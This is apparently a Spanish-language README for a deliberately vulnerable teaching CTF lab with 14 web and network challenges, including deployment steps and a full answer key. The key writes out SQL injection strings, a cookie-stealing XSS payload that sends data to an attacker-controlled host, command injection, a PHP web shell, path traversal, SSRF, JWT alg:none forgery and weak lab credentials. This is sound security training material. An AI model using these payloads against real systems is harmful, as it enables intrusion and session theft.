# Lola's VIP CTF — Laboratorio de Ciberseguridad Vulnerable

Entorno intencionalmente vulnerable, estilo DVWA/Mutillidae, para practicar explotación
controlada desde Kali Linux. Incluye 14 retos (11 web + 3 de red) de dificultad
variable, organizados como un salón con 14 "mesas" que se resuelven en orden,
pensado como un reto serio, sin límite de tiempo fijo.

La máquina y el proyecto en VirtualBox/Vagrant conservan el nombre técnico
`NullNido-CTF` (es solo el identificador interno de la VM); la aplicación web que
corre adentro se llama **Lola's VIP**.

⚠️ **Uso exclusivo en entorno aislado / red de laboratorio.** No exponer estos servicios
a Internet ni a redes compartidas con otros equipos.

---

## 1. Requisitos

- Un host con **Docker** y **docker-compose** (modo rápido), **o**
- **VirtualBox + Vagrant** (para desplegar como VM completa)
- Una VM de **Kali Linux** en la misma red que el objetivo

## 2. Despliegue — Opción A: Docker Compose (desarrollo/pruebas rápidas)

```bash
cd nullnido-ctf
docker compose up -d --build
```

Servicios disponibles en `localhost` (o la IP del host donde corras Docker):

| Servicio | Puerto | Detalle |
|---|---|---|
| Web (Lola's VIP) | 8080 | HTTP |
| FTP anónimo | 2121 (+ 21100-21110 pasivo) | usuario `anonymous` |
| SSH | 2222 | usuario `admin` |
| Redis | 6379 | sin autenticación |
| MySQL | interno (no expuesto al host) | solo accesible entre contenedores |

## 3. Despliegue — Opción B: VM completa con Vagrant

```bash
cd nullnido-ctf
vagrant up
```

Esto crea una VM Debian con **escritorio gráfico XFCE** (no solo consola), con Docker
instalado, despliega automáticamente los **5 servicios** (web, base de datos, FTP,
SSH, Redis) y los publica en una red **host-only**: `192.168.56.20`. La ventana de
VirtualBox se abre sola al final del aprovisionamiento (puede tardar 10-20 min la
primera vez, según tu conexión).

**Credenciales del escritorio:** usuario `vagrant`, contraseña `vagrant` (queda con
inicio de sesión automático configurado, no deberías necesitar escribirla salvo para
`sudo`).

### 3.1 Exportar la VM como `.ova` para instalarla en otros hosts

Una vez que `vagrant up` termine y la VM esté corriendo con todo desplegado, desde
una terminal en tu PC (no dentro de la VM) ejecuta:

```bash
VBoxManage export "NullNido-CTF" --output nullnido-ctf.ova
```

El archivo `nullnido-ctf.ova` resultante (varios GB, porque incluye las imágenes
Docker ya construidas) se puede importar directamente en **cualquier otro host con
VirtualBox**, sin necesidad de Vagrant ni de reconstruir nada:
`VirtualBox → Archivo → Importar servicio virtualizado → seleccionar el .ova`.
Al encenderla ya tendrá los 5 servicios corriendo automáticamente (Docker inicia
los contenedores al arrancar el sistema, gracias a `restart: unless-stopped`).

Para atacar desde Kali en el host de destino:
1. Configura tu VM de Kali con un adaptador de red en la **misma red host-only**
   (VirtualBox → Configuración → Red → Adaptador 2 → "Red solo-anfitrión"). Si esa
   red no existe en el nuevo host, créala (VirtualBox → Herramientas → Redes →
   Redes solo-anfitrión → Crear); por defecto queda en `192.168.56.1/24`, que es el
   rango que la VM espera.
2. Verifica conectividad: `ping 192.168.56.20`
3. Enumera con `nmap -sC -sV -p- 192.168.56.20`

## 4. Enumeración sugerida desde Kali

```bash
nmap -sC -sV -p 2121,2222,6379,8080 192.168.56.20
```

Deberías ver: HTTP (Apache/PHP) en 8080, FTP (vsftpd, permite anónimo) en 2121,
SSH (OpenSSH) en 2222, y Redis sin autenticación en 6379. El puerto 22 "normal"
pertenece al SSH propio de la VM (usado por Vagrant), no al contenedor vulnerable.
MySQL no se expone al host — solo es alcanzable entre contenedores.

---

## 5. Lola's VIP: mesas, puntos y pistas

La app tiene identidad de marca propia: **Lola's VIP**, un salón privado con 14
**mesas**, cada una con un nombre artístico. `includes/mesas.php` es la fuente
única de verdad (orden, nombre, flag, página y pista de cada mesa). Login en
pantalla dividida y, tras iniciar sesión, una barra lateral con acceso a todos
los módulos, cada uno etiquetado con su mesa correspondiente.

| Mesa | Nombre | Categoría | Dónde | Puntos |
|---|---|---|---|---|
| 1 | Jazmín | FTP anónimo | FTP (2121) | 50 |
| 2 | Luna | SSH credenciales débiles | SSH (2222) | 100 |
| 3 | Dalia | Redis sin autenticación | Redis (6379) | 50 |
| 4 | Zafiro | SQL Injection (login, con filtro) | Web `/login.php` | 100 |
| 5 | Perla | IDOR | Web `/facturas.php` | 75 |
| 6 | Escarlata | XSS almacenado (con filtro) | Web `/perfil.php` | 125 |
| 7 | Noir | Command Injection (con filtro) | Web `/diagnostico.php` | 150 |
| 8 | Ónix | Subida insegura de archivos (RCE) | Web `/upload.php` | 175 |
| 9 | Duquesa | SQL Injection UNION-based | Web `/directorio.php` | 150 |
| 10 | Aurora | Path Traversal / LFI | Web `/documento.php` | 125 |
| 11 | Medianoche | SSRF | Web `/enlace.php` | 175 |
| 12 | Carmesí | Deserialización insegura | Web `/preferencias.php` | 200 |
| 13 | Seda | JWT — bypass `alg:none` | Web `/api/soporte.php` → `/api/panel.php` | 200 |
| 14 | Fatale | Análisis de tráfico (Wireshark) | Web `/descargas.php` | 125 |

Cada reto entrega una flag con formato `NIDO{...}`, registrable en el **Scoreboard**
(`/scoreboard.php`).

### 5.1 Orden secuencial

Las mesas se acreditan **en orden estricto, de la 1 a la 14**. El acceso a cada
*página* no está bloqueado — se puede navegar libremente, como en un pentest real —
pero el Scoreboard solo acepta la flag de la Mesa N si ya se acreditó la Mesa N-1;
si no, devuelve un mensaje pidiendo resolver la mesa que corresponde. También evita
contar la misma flag dos veces por usuario (tabla `solves`), muestra el estado de
cada mesa (Resuelta / Te toca ahora / Bloqueada) y reproduce un sonido de acierto
(`assets/acierto.mp3`) cada vez que se acredita una mesa nueva. El Scoreboard es la
única parte de la app que usa código seguro (prepared statements) a propósito, ya
que no es un reto en sí, sino la herramienta para llevar el puntaje.

### 5.2 Sistema de pistas

Dos formas de pedir ayuda sin que nadie tenga que mirar el answer key:
- **Botón "💡 Pista" en cada página de reto** (login, perfil, facturas, diagnóstico,
  upload, directorio, documento, preferencias, enlace, soporte API): abre una ventana
  emergente (`<dialog>` nativo del navegador) con una pista puntual de esa mesa.
- **Página `/pistas.php`** (en el menú lateral): lista las 14 mesas con su pista,
  incluidas las 3 de red (FTP/SSH/Redis) que no tienen página propia donde poner el
  botón.

Las pistas apuntan hacia la técnica (p. ej. "el filtro bloquea X, pero no Y") sin
regalar el payload exacto ni la flag — están pensadas para destrabar a alguien que
lleva un rato sin avanzar, no para resolver la mesa por él.

---

## 6. Guía paso a paso de resolución por mesa (Answer key)

> El Scoreboard (`/scoreboard.php`) valida las banderas en orden secuencial de la Mesa 1 a la 14. Si ejecutas el entorno con Docker Compose en tu host en lugar de la VM host-only, reemplaza `192.168.56.20` por `localhost`.

### Mesa 1 — Jazmín (FTP anónimo · Puerto 2121)
1. Conéctate al servicio FTP anónimo:
   ```bash
   ftp 192.168.56.20 2121
   ```
   Usa `anonymous` como usuario y deja la contraseña vacía (*Enter*).
2. Lista y descarga los archivos disponibles:
   ```text
   ls
   get flag.txt
   get notas_internas.txt
   bye
   ```
3. Inspecciona los archivos descargados en tu terminal:
   ```bash
   cat flag.txt
   cat notas_internas.txt
   ```
4. Registra la bandera `NIDO{...}` en `/scoreboard.php`.

---

### Mesa 2 — Luna (SSH con credenciales débiles · Puerto 2222)
1. Revisa el usuario y la pista obtenida en `notas_internas.txt` (usuario `admin`, contraseña débil `admin123`).
2. Conéctate por SSH al puerto `2222` (correspondiente al contenedor del reto, distinto del puerto `22` de administración):
   ```bash
   ssh admin@192.168.56.20 -p 2222
   ```
3. Una vez dentro de la sesión, consulta el archivo de bandera:
   ```bash
   ls -la
   cat flag.txt
   ```
4. Registra la bandera `NIDO{...}` en `/scoreboard.php`.

---

### Mesa 3 — Dalia (Redis sin autenticación · Puerto 6379)
1. Conéctate al servicio Redis expuesto sin autenticación:
   ```bash
   redis-cli -h 192.168.56.20 -p 6379
   ```
2. Enumera las claves almacenadas y consulta el valor asociado a la bandera:
   ```text
   KEYS *
   GET flag
   ```
3. Registra la bandera `NIDO{...}` en `/scoreboard.php`.

---

### Mesa 4 — Zafiro (SQL Injection en login con filtro · `/login.php`)
1. Accede a `/login.php` en el navegador. El filtro bloquea `--`, pero permite `#` para comentar el resto de la sentencia SQL.
2. Envía `admin'#` en el campo de usuario y cualquier valor en el campo de contraseña.
3. Revisa la biografía o perfil del administrador autenticada para obtener `NIDO{...}` y regístrala en `/scoreboard.php`.

---

### Mesa 5 — Perla (IDOR · `/facturas.php`)
1. Inicia sesión en la aplicación web y abre `/facturas.php`.
2. Modifica el parámetro identificador en la URL (por ejemplo, `?id=1`) para consultar facturas de otros registros sin control de autorización adecuado.
3. Localiza la bandera `NIDO{...}` en la factura consultada y envíala en `/scoreboard.php`.

---

### Mesa 6 — Escarlata (XSS almacenado con filtro · `/perfil.php`)
1. Inicia un servidor HTTP receptor en tu máquina de análisis (por ejemplo en el puerto `8000`, usando una IP alcanzable desde el entorno que visita el perfil):
   ```bash
   python3 -m http.server 8000
   ```
2. Entra a `/perfil.php`. Dado que el filtro bloquea `<script>`, utiliza un atributo de evento HTML como `onerror` en `<img>` para enviar `document.cookie` hacia tu receptor:
   ```html
   <img src=x onerror="fetch('http://TU_IP_RECEPTOR:8000/?c='+encodeURIComponent(document.cookie))">
   ```
3. Guarda el perfil y espera la llegada de la solicitud con `flag_xss` en los registros de tu servidor HTTP.
4. Decodifica el parámetro recibido para obtener `NIDO{...}` y regístrala en `/scoreboard.php`.

---

### Mesa 7 — Noir (Command Injection con filtro · `/diagnostico.php`)
1. Abre `/diagnostico.php`. El filtro restringe separadores clásicos como `;`, `&` y `|`, pero permite sustitución de comandos con `$(...)`.
2. Envía un objetivo válido junto con la sustitución de comandos para leer `/flag_diagnostico.txt`:
   ```text
   127.0.0.1 $(cat /flag_diagnostico.txt)
   ```
3. Revisa la salida en pantalla para extraer `NIDO{...}` y regístrala en `/scoreboard.php`.

---

### Mesa 8 — Ónix (Subida insegura de archivos / RCE · `/upload.php`)
1. Prepara un archivo PHP con una extensión alternativa no contemplada en la lista negra (por ejemplo `shell.pht`):
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Sube el archivo desde `/upload.php`.
3. Accede al recurso subido en `/uploads/shell.pht` pasando el comando por parámetro GET para leer `/var/www/flag_upload.txt`:
   ```text
   /uploads/shell.pht?cmd=cat+/var/www/flag_upload.txt
   ```
4. Obtén la bandera `NIDO{...}` y regístrala en `/scoreboard.php`.

---

### Mesa 9 — Duquesa (SQL Injection UNION-based · `/directorio.php`)
1. Visita `/directorio.php?nombre=` y determina el número de columnas de la consulta con `ORDER BY` (por ejemplo, `' ORDER BY 2-- ` y `' ORDER BY 3-- `).
2. Con el número de columnas alineado (2 columnas), utiliza una inyección `UNION SELECT` para consultar la tabla `secretos`:
   ```text
   xx' UNION SELECT flag, descripcion FROM secretos-- 
   ```
   *(Codifica los espacios como `%20` o `+` si el parámetro se envía directamente en la query string).*
3. Copia la bandera `NIDO{...}` y envíala en `/scoreboard.php`.

---

### Mesa 10 — Aurora (Path Traversal / LFI · `/documento.php`)
1. Accede a `/documento.php?archivo=`.
2. Utiliza secuencias `../` para salir del directorio base y leer `flag_lfi.txt`:
   ```text
   /documento.php?archivo=../../flag_lfi.txt
   ```
3. Registra la bandera `NIDO{...}` obtenida en `/scoreboard.php`.

---

### Mesa 11 — Medianoche (SSRF · `/enlace.php`)
1. Entra a `/enlace.php`. El recurso `/internal/flag_ssrf.php` está restringido a peticiones locales del servidor.
2. Envía una referencia a localhost apuntando a dicho endpoint interno:
   ```text
   http://127.0.0.1/internal/flag_ssrf.php
   ```
3. Recupera la bandera `NIDO{...}` de la respuesta y regístrala en `/scoreboard.php`.

---

### Mesa 12 — Carmesí (Deserialización insegura · `/preferencias.php`)
1. Abre `/preferencias.php` y guarda preferencias para generar la cookie `prefs` (objeto serializado de PHP codificado en Base64).
2. Decodifica la cookie `prefs` desde Base64 para inspeccionar su estructura serializada (como el flag `mostrar_flag` en `b:0`).
3. Cambia el indicador a `b:1`, ajusta las longitudes de cadena (`s:N:"..."`) en la serialización de PHP si alteraste algún texto, vuelve a codificar en Base64 y actualiza la cookie `prefs`.
4. Recarga `/preferencias.php` para ver la bandera `NIDO{...}` y regístrala en `/scoreboard.php`.

---

### Mesa 13 — Seda (JWT `alg:none` · `/api/soporte.php` → `/api/panel.php`)
1. Consulta `/api/soporte.php` para obtener el token JWT (por ejemplo desde la cookie `nn_jwt`).
2. Decodifica el **Header** y el **Payload** desde Base64URL.
3. Modifica `"alg"` a `"none"` en el Header y cambia el rol a `"admin"` en el Payload.
4. Codifica ambos segmentos en Base64URL sin relleno (`=`) y construye el token con la firma vacía (`header.payload.`).
5. Actualiza la cookie `nn_jwt`, accede a `/api/panel.php` y registra la bandera `NIDO{...}` en `/scoreboard.php`.

---

### Mesa 14 — Fatale (Análisis de tráfico con Wireshark · `/descargas.php`)
1. Descarga `network_capture.pcap` desde `/descargas.php` y ábrelo en **Wireshark**.
2. Filtra tráfico HTTP, haz clic derecho en un paquete HTTP y selecciona **Follow → HTTP Stream**.
3. Localiza el encabezado `Authorization: Basic <cadena_base64>` y decodifica `<cadena_base64>` para obtener las credenciales/bandera (`NIDO{...}`).
4. Registra la bandera en `/scoreboard.php`.

## 7. Estructura del proyecto

```
nullnido-ctf/
├── docker-compose.yml
├── Vagrantfile
├── web/
│   ├── Dockerfile
│   ├── apache-config/     -> restricción a /internal (Mesa 11) y handler .pht (Mesa 8)
│   ├── db/init.sql        -> usuarios, facturas, directorio, secretos, retos, solves
│   └── src/
│       ├── includes/      -> layout, brand, mesas.php (orden/nombres/flags/pistas), jwt.php
│       ├── assets/        -> style.css, acierto.mp3 (sonido del scoreboard)
│       ├── api/           -> soporte.php y panel.php (Mesa 13, JWT)
│       ├── internal/      -> flag_ssrf.php (Mesa 11, solo accesible en localhost)
│       ├── descargas/     -> network_capture.pcap (Mesa 14, Wireshark)
│       ├── login.php, index.php, perfil.php, facturas.php, diagnostico.php,
│       │   upload.php, directorio.php, documento.php, preferencias.php,
│       │   enlace.php, descargas.php, pistas.php, scoreboard.php
│       └── uploads/       -> destino de la Mesa 8 (subida insegura)
├── ftp/data/      -> flag.txt (Mesa 1) + notas_internas.txt (pista hacia Mesa 2)
├── ssh/           -> Dockerfile con usuario admin:admin123 (Mesa 2)
└── redis/         -> Dockerfile con flag precargada (Mesa 3)
```

## 8. Sugerencia de entregable para la materia

Además del código, documenta por cada mesa:
- Vulnerabilidad (mapeada a **OWASP Top 10** o **CWE** correspondiente)
- Payload/comando usado para explotarla
- Evidencia (captura de pantalla de la flag obtenida)
- Remediación: cómo se corrige en el código (ej. prepared statements, whitelisting
  de extensiones, `escapeshellarg()`, `requirepass` en Redis, deshabilitar acceso
  anónimo en FTP, políticas de contraseñas fuertes, restringir algoritmos JWT,
  no confiar en datos deserializados del cliente)

Esto convierte el proyecto en un ejercicio completo de **ataque + análisis defensivo**,
que suele pesar más en la evaluación que solo "conseguir la flag".
